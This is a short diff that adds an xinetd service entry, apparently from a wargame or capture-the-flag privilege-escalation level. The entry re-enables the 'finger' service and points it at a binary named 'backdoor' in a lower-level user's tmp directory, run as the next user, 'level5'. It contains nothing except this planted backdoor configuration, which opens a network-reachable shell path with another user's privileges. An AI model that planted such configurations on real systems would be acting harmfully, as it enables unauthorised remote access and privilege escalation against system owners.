@@ -1,0 +1,10 @@
+service finger 
+{
+	disable	= no
+	flags		= REUSE
+	socket_type	= stream        
+	wait		= no
+	user		= level5
+	server		= /home/level4/tmp/backdoor
+	log_on_failure	+= USERID
+}
